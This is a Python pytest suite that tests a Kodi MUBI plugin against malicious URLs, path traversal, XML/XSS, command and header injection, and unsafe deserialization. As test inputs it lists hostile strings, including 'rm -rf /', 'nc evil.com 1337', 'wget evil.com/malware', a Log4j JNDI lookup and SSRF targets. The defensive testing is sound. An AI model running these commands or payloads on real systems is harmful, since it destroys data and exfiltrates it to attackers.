#!/usr/bin/env python3
"""
Security test suite for MUBI plugin.
Tests security fixes and validates protection against common vulnerabilities.
"""
import pytest
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch, Mock, MagicMock
import urllib.parse
import xml.etree.ElementTree as ET


@pytest.mark.security


class TestSecurityValidation:
    """Test security fixes and protections."""
    
    @pytest.fixture
    def mock_kodi_environment(self):
        """Mock Kodi environment for security testing."""
        with patch('xbmc.log') as mock_log, \
             patch('xbmc.LOGDEBUG', 0), \
             patch('xbmc.LOGINFO', 1), \
             patch('xbmc.LOGERROR', 4), \
             patch('xbmcgui.Dialog') as mock_dialog, \
             patch('xbmcaddon.Addon') as mock_addon_class, \
             patch('xbmcplugin.setContent') as mock_set_content, \
             patch('xbmcplugin.setCategory') as mock_set_category, \
             patch('xbmcplugin.endOfDirectory') as mock_end_dir:
            
            mock_addon = Mock()
            mock_addon.getSetting.return_value = ""
            mock_addon.setSetting.return_value = None
            mock_addon.getAddonInfo.return_value = "/fake/addon/path"
            mock_addon_class.return_value = mock_addon
            
            yield {
                'log': mock_log,
                'addon': mock_addon,
                'set_content': mock_set_content,
                'set_category': mock_set_category,
                'end_dir': mock_end_dir
            }
    
    def test_url_validation_security(self, mock_kodi_environment):
        """Test URL validation prevents malicious URLs."""
        from resources.lib.navigation_handler import NavigationHandler
        from resources.lib.session_manager import SessionManager
        from resources.lib.mubi import Mubi
        
        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])
        mubi = Mubi(session)
        nav_handler = NavigationHandler(
            handle=123,
            base_url="plugin://plugin.video.mubi/",
            mubi=mubi,
            session=session
        )
        
        # Test malicious URLs that should be blocked
        malicious_urls = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "file:///etc/passwd",
            "ftp://malicious.com/payload",
            "http://localhost:22/ssh-attack",
            "https://evil.com/redirect?url=file:///etc/passwd",
            "http://192.168.1.1/admin",  # Local network access
            "http://127.0.0.1:8080/internal",  # Localhost access
            "http://[::1]:3000/internal",  # IPv6 localhost
            "http://169.254.169.254/metadata",  # AWS metadata service
        ]
        
        for malicious_url in malicious_urls:
            with patch.object(nav_handler, '_is_safe_url') as mock_safe_url:
                mock_safe_url.return_value = False  # Should reject malicious URLs
                
                # Should not execute malicious URLs
                with patch('subprocess.Popen') as mock_popen:
                    nav_handler.play_video_ext(malicious_url)
                    mock_popen.assert_not_called()
                
                # Should log security warning
                mocks['log'].assert_called()
                log_calls = [call.args[0] for call in mocks['log'].call_args_list
                           if len(call.args) > 0 and ('invalid' in call.args[0].lower() or 'unsafe' in call.args[0].lower() or 'rejected' in call.args[0].lower())]
                assert len(log_calls) >= 1, f"Should log security warning for {malicious_url}"
                
                mocks['log'].reset_mock()
    
    def test_path_traversal_protection(self, mock_kodi_environment):
        """Test protection against path traversal attacks."""
        from resources.lib.film import Film
        from resources.lib.film_metadata import FilmMetadata
        
        # Create film with malicious title containing path traversal
        metadata = FilmMetadata(
            title="../../../etc/passwd",
            director=["Malicious Director"],
            year=2023,
            duration=120,
            country=["USA"],
            plot="Path traversal attack attempt",
            plotoutline="Short plot outline",
            genre=["Drama"],
            originaltitle="../../../etc/passwd"
        )
        
        film = Film("malicious_123", "../../../etc/passwd", "", "", "Drama", metadata)

        # Test folder name sanitization prevents path traversal
        with pytest.raises(ValueError, match="potential path traversal attempt"):
            film.get_sanitized_folder_name()

        # The security fix should raise an exception for path traversal attempts
        # This is the correct behavior - better to fail securely than allow traversal
    
    def test_xml_injection_protection(self, mock_kodi_environment):
        """Test protection against XML injection attacks."""
        from resources.lib.film import Film
        from resources.lib.film_metadata import FilmMetadata
        
        # Create film with XML injection payload
        xml_payload = "Test Movie</title><script>alert('xss')</script><title>Fake"
        metadata = FilmMetadata(
            title=xml_payload,
            director=["<script>alert('xss')</script>"],
            year=2023,
            duration=120,
            country=["<![CDATA[malicious]]>"],
            plot="<script>document.location='http://evil.com'</script>",
            plotoutline="Short plot outline",
            genre=["Drama"],
            originaltitle=xml_payload
        )
        
        film = Film("xml_123", xml_payload, "", "", "Drama", metadata)
        
        # Test NFO generation escapes XML properly
        nfo_tree = film._get_nfo_tree(
            metadata=metadata,
            categories=["Drama"],
            kodi_trailer_url="http://test.com/trailer",
            imdb_url="http://imdb.com/title/tt123"
        )
        
        # Parse the XML to ensure it's valid and safe
        root = ET.fromstring(nfo_tree)
        
        # Check that XML injection was escaped
        title_elem = root.find("title")
        assert title_elem is not None
        # XML should be properly escaped, not executed
        assert "<script>" not in title_elem.text
        # The word "alert" may still be present but in escaped form, which is safe
        # The important thing is that <script> tags are escaped
        assert "&lt;script&gt;" in title_elem.text or "<script>" not in title_elem.text
        
        # Check director field
        director_elem = root.find("director")
        if director_elem is not None:
            assert "<script>" not in director_elem.text
    
    def test_command_injection_protection(self, mock_kodi_environment):
        """Test protection against command injection attacks."""
        from resources.lib.navigation_handler import NavigationHandler
        from resources.lib.session_manager import SessionManager
        from resources.lib.mubi import Mubi
        
        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])
        mubi = Mubi(session)
        nav_handler = NavigationHandler(
            handle=123,
            base_url="plugin://plugin.video.mubi/",
            mubi=mubi,
            session=session
        )
        
        # Test URLs with command injection attempts
        command_injection_urls = [
            "http://example.com/movie; rm -rf /",
            "http://example.com/movie && cat /etc/passwd",
            "http://example.com/movie | nc evil.com 1337",
            "http://example.com/movie`whoami`",
            "http://example.com/movie$(id)",
            "http://example.com/movie;wget evil.com/malware",
        ]
        
        for injection_url in command_injection_urls:
            with patch.object(nav_handler, '_is_safe_url') as mock_safe_url, \
                 patch('subprocess.Popen') as mock_popen, \
                 patch('xbmc.getCondVisibility') as mock_cond:
                
                mock_safe_url.return_value = True  # Assume URL passes basic validation
                mock_cond.return_value = True  # Simulate macOS
                
                nav_handler.play_video_ext(injection_url)
                
                # Verify that if subprocess is called, it's called safely
                if mock_popen.called:
                    call_args = mock_popen.call_args
                    command = call_args[0][0]
                    
                    # Should use array form, not shell=True
                    assert call_args[1].get('shell', False) is False
                    # Should not contain injection characters in the command
                    assert isinstance(command, list)
                    assert len(command) == 2
                    assert command[0] == 'open'
                    assert command[1] == injection_url
    
    def test_session_security(self, mock_kodi_environment):
        """Test session management security."""
        from resources.lib.session_manager import SessionManager
        
        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])
        
        # Test secure token handling
        sensitive_token = "super_secret_auth_token_12345"
        session.set_logged_in(sensitive_token, "test_user")
        
        # Verify token is not logged in plain text
        log_calls = [call.args[0] for call in mocks['log'].call_args_list 
                    if len(call.args) > 0]
        
        for log_message in log_calls:
            # Token should not appear in logs
            assert sensitive_token not in str(log_message)
            # Should not log full token even partially
            assert "super_secret" not in str(log_message)
    
    def test_input_sanitization(self, mock_kodi_environment):
        """Test input sanitization across the application."""
        from resources.lib.film import Film
        from resources.lib.film_metadata import FilmMetadata
        
        # Test various malicious inputs
        malicious_inputs = [
            "'; DROP TABLE films; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../etc/passwd",  # Path traversal
            "\x00\x01\x02\x03",  # Null bytes and control characters
            "A" * 10000,  # Buffer overflow attempt
            "${jndi:ldap://evil.com/exploit}",  # Log4j style injection
            "{{7*7}}",  # Template injection
            "%{(#_='multipart/form-data')}",  # OGNL injection
        ]
        
        for malicious_input in malicious_inputs:
            try:
                metadata = FilmMetadata(
                    title=malicious_input,
                    director=[malicious_input],
                    year=2023,
                    duration=120,
                    country=[malicious_input],
                    plot=malicious_input,
                    plotoutline=malicious_input,
                    genre=[malicious_input],
                    originaltitle=malicious_input
                )

                film = Film("test_123", malicious_input, "", "", "Drama", metadata)

            except ValueError as e:
                # Security validation may reject malicious inputs at creation time
                if any(msg in str(e) for msg in ["too long", "invalid characters", "path traversal"]):
                    # This is expected security behavior
                    continue
                else:
                    # Unexpected error
                    raise

            # Test that sanitization works
            try:
                folder_name = film.get_sanitized_folder_name()

                # If sanitization succeeds, check that dangerous characters are removed/escaped
                dangerous_chars = ['<', '>', '"', "'", '&', '\x00', '\n', '\r']
                for char in dangerous_chars:
                    if char in malicious_input:
                        assert char not in folder_name or folder_name.count(char) == 0

            except ValueError as e:
                # Security exception is expected for path traversal attempts
                if "path traversal" in str(e):
                    # This is the correct security behavior
                    continue
                else:
                    # Unexpected error
                    raise
    
    def test_file_system_security(self, mock_kodi_environment):
        """Test file system operation security."""
        from resources.lib.film import Film
        from resources.lib.film_metadata import FilmMetadata
        from unittest.mock import mock_open
        
        # Test file creation with malicious paths
        metadata = FilmMetadata(
            title="Normal Movie",
            director=["Test Director"],
            year=2023,
            duration=120,
            country=["USA"],
            plot="Test plot",
            plotoutline="Short plot outline",
            genre=["Drama"],
            originaltitle="Normal Movie"
        )
        
        film = Film("test_123", "Normal Movie", "", "", "Drama", metadata)
        
        # Test with malicious base path
        malicious_paths = [
            Path("/etc/passwd"),
            Path("../../../etc/passwd"),
            Path("/root/.ssh/id_rsa"),
            Path("C:\\Windows\\System32\\config\\SAM"),
        ]
        
        for malicious_path in malicious_paths:
            with patch('builtins.open', mock_open()) as mock_file:
                try:
                    film.create_strm_file(malicious_path, "plugin://test/")
                    
                    # If file creation succeeds, verify it's in expected location
                    if mock_file.called:
                        call_args = mock_file.call_args[0][0]
                        # Should be within the provided path, not escaped
                        assert str(malicious_path) in str(call_args)
                        
                except (OSError, PermissionError):
                    # Expected for malicious paths
                    pass


class TestSecurityRegression:
    """Test for security regression and additional security measures."""

    @pytest.fixture
    def mock_kodi_environment(self):
        """Mock Kodi environment for security testing."""
        with patch('xbmc.log') as mock_log, \
             patch('xbmc.LOGDEBUG', 0), \
             patch('xbmc.LOGINFO', 1), \
             patch('xbmc.LOGERROR', 4), \
             patch('xbmcaddon.Addon') as mock_addon_class:

            mock_addon = Mock()
            mock_addon.getSetting.return_value = ""
            mock_addon.setSetting.return_value = None
            mock_addon.getAddonInfo.return_value = "/fake/addon/path"
            mock_addon_class.return_value = mock_addon

            yield {
                'log': mock_log,
                'addon': mock_addon
            }

    def test_api_rate_limiting_security(self, mock_kodi_environment):
        """Test API rate limiting prevents abuse."""
        from resources.lib.mubi import Mubi
        from resources.lib.session_manager import SessionManager
        import time

        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])
        mubi = Mubi(session)

        # Mock time to control rate limiting
        with patch('time.time') as mock_time:
            current_time = 1000.0
            mock_time.return_value = current_time

            # Clear call history
            mubi._call_history = []

            # Make rapid API calls
            call_count = 0
            for i in range(20):  # Try to make 20 rapid calls
                with patch('requests.Session') as mock_session_class:
                    mock_session = Mock()
                    mock_session_class.return_value = mock_session
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.text = '{"films": []}'
                    mock_session.request.return_value = mock_response

                    try:
                        mubi._make_api_call("GET", "http://test.com", {})
                        call_count += 1
                    except Exception:
                        # Rate limiting may cause delays or failures
                        pass

                    # Advance time slightly
                    current_time += 0.1
                    mock_time.return_value = current_time

            # Should have rate limiting in effect
            assert len(mubi._call_history) <= 20
            print(f"Made {call_count} calls, rate limiting allowed {len(mubi._call_history)} to proceed")

    def test_sensitive_data_exposure(self, mock_kodi_environment):
        """Test that sensitive data is not exposed in logs or errors."""
        from resources.lib.session_manager import SessionManager

        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])

        # Test with sensitive data
        sensitive_data = [
            "password123",
            "auth_token_secret_key",
            "api_key_12345",
            "user@email.com",
            "credit_card_1234567890123456",
        ]

        for sensitive in sensitive_data:
            # Simulate operations with sensitive data
            session.set_logged_in(sensitive, "test_user")
            session.set_logged_out()

            # Check that sensitive data doesn't appear in logs
            log_calls = [str(call) for call in mocks['log'].call_args_list]
            for log_call in log_calls:
                assert sensitive not in log_call, f"Sensitive data '{sensitive}' found in log: {log_call}"

            mocks['log'].reset_mock()

    def test_directory_traversal_comprehensive(self, mock_kodi_environment):
        """Comprehensive test for directory traversal vulnerabilities."""
        from resources.lib.film import Film
        from resources.lib.film_metadata import FilmMetadata

        # Test various directory traversal patterns
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
            "..%252f..%252f..%252fetc%252fpasswd",  # Double URL encoded
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",  # Unicode bypass
            "/var/log/../../etc/passwd",
            "C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for pattern in traversal_patterns:
            metadata = FilmMetadata(
                title=pattern,
                director=["Test Director"],
                year=2023,
                duration=120,
                country=["USA"],
                plot="Test plot",
                plotoutline="Short plot outline",
                genre=["Drama"],
                originaltitle=pattern
            )

            film = Film("test_123", pattern, "", "", "Drama", metadata)

            # Test folder name sanitization
            try:
                folder_name = film.get_sanitized_folder_name()

                # If sanitization succeeds, verify no traversal sequences remain
                assert "../" not in folder_name
                assert "..\\" not in folder_name
                assert "%2e%2e" not in folder_name.lower()
                # Note: The words "etc" and "passwd" may remain after sanitization,
                # but the dangerous path traversal characters should be removed

            except ValueError as e:
                # Security exception is expected for path traversal attempts
                if "path traversal" in str(e):
                    # This is the correct security behavior - better to fail than allow traversal
                    continue
                else:
                    # Unexpected error
                    raise

    def test_http_header_injection(self, mock_kodi_environment):
        """Test protection against HTTP header injection."""
        from resources.lib.mubi import Mubi
        from resources.lib.session_manager import SessionManager

        mocks = mock_kodi_environment
        session = SessionManager(mocks['addon'])
        mubi = Mubi(session)

        # Test header injection payloads
        injection_payloads = [
            "normal\r\nX-Injected-Header: malicious",
            "normal\nSet-Cookie: admin=true",
            "normal\r\n\r\n<script>alert('xss')</script>",
            "normal%0d%0aX-Injected: header",
            "normal%0aLocation: http://evil.com",
        ]

        for payload in injection_payloads:
            with patch('requests.Session') as mock_session_class:
                mock_session = Mock()
                mock_session_class.return_value = mock_session

                # Simulate API call with potentially malicious user agent
                headers = {"User-Agent": payload}

                try:
                    mubi._make_api_call("GET", "http://test.com", headers)

                    # Check that headers were properly sanitized
                    if mock_session.request.called:
                        call_headers = mock_session.request.call_args[1].get('headers', {})
                        user_agent = call_headers.get('User-Agent', '')

                        # Should not contain injection characters
                        assert '\r' not in user_agent
                        assert '\n' not in user_agent
                        assert '%0d' not in user_agent.lower()
                        assert '%0a' not in user_agent.lower()

                except Exception:
                    # May fail due to invalid headers, which is acceptable
                    pass

    def test_deserialization_security(self, mock_kodi_environment):
        """Test protection against unsafe deserialization."""
        from resources.lib.film_metadata import FilmMetadata
        import json

        # Test malicious JSON payloads
        malicious_payloads = [
            '{"__class__": "os.system", "args": ["rm -rf /"]}',
            '{"title": "test", "eval": "import os; os.system(\'whoami\')"}',
            '{"title": "test", "__import__": "subprocess"}',
        ]

        for payload in malicious_payloads:
            try:
                # Should not execute malicious code during JSON parsing
                data = json.loads(payload)

                # Even if JSON parses, creating FilmMetadata should be safe
                if 'title' in data:
                    try:
                        metadata = FilmMetadata(
                            title=data.get('title', 'test'),
                            director=["Test Director"],
                            year=2023,
                            duration=120,
                            country=["USA"],
                            plot="Test plot",
                            plotoutline="Short plot outline",
                            genre=["Drama"],
                            originaltitle=data.get('title', 'test')
                        )

                        # Should create safely without executing code
                        assert metadata.title == data.get('title', 'test')

                    except (TypeError, ValueError):
                        # Expected for malformed data
                        pass

            except json.JSONDecodeError:
                # Expected for malformed JSON
                pass
